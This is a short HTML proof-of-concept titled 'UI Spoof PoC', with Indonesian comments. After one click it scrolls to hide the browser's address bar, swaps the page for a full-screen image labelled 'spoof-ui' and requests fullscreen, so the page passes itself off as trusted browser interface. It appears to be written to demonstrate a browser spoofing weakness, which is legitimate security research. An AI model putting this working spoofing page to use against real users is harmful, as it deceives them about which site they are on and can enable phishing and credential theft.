<!DOCTYPE html>
<html lang="en">
<head>
  <title>UI Spoof PoC</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 200vh; /* buat scroll hide omnibox */
      background: #000;
      font-family: system-ui, sans-serif;
    }

    #spoof {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: contain;
      background: #000;
      display: none;
      z-index: 9999;
    }

    #content {
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      text-align: center;
    }
  </style>
</head>

<body>

<img id="spoof" src="spof.png" alt="spoof-ui">

<div id="content">
  <h1>Click anywhere</h1>
</div>

<script>
let once = false;

onclick = () => {
  if (once) return;
  once = true;

  // hide omnibox
  window.scrollTo(0, 1);

  content.style.display = "none";
  spoof.style.display = "block";

  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen().catch(() => {});
  }
};

// detect keluar fullscreen â†’ scroll ke atas
document.addEventListener("fullscreenchange", () => {
  if (!document.fullscreenElement) {
    window.scrollTo(0, 0);
  }
});
</script>

</body>
</html>
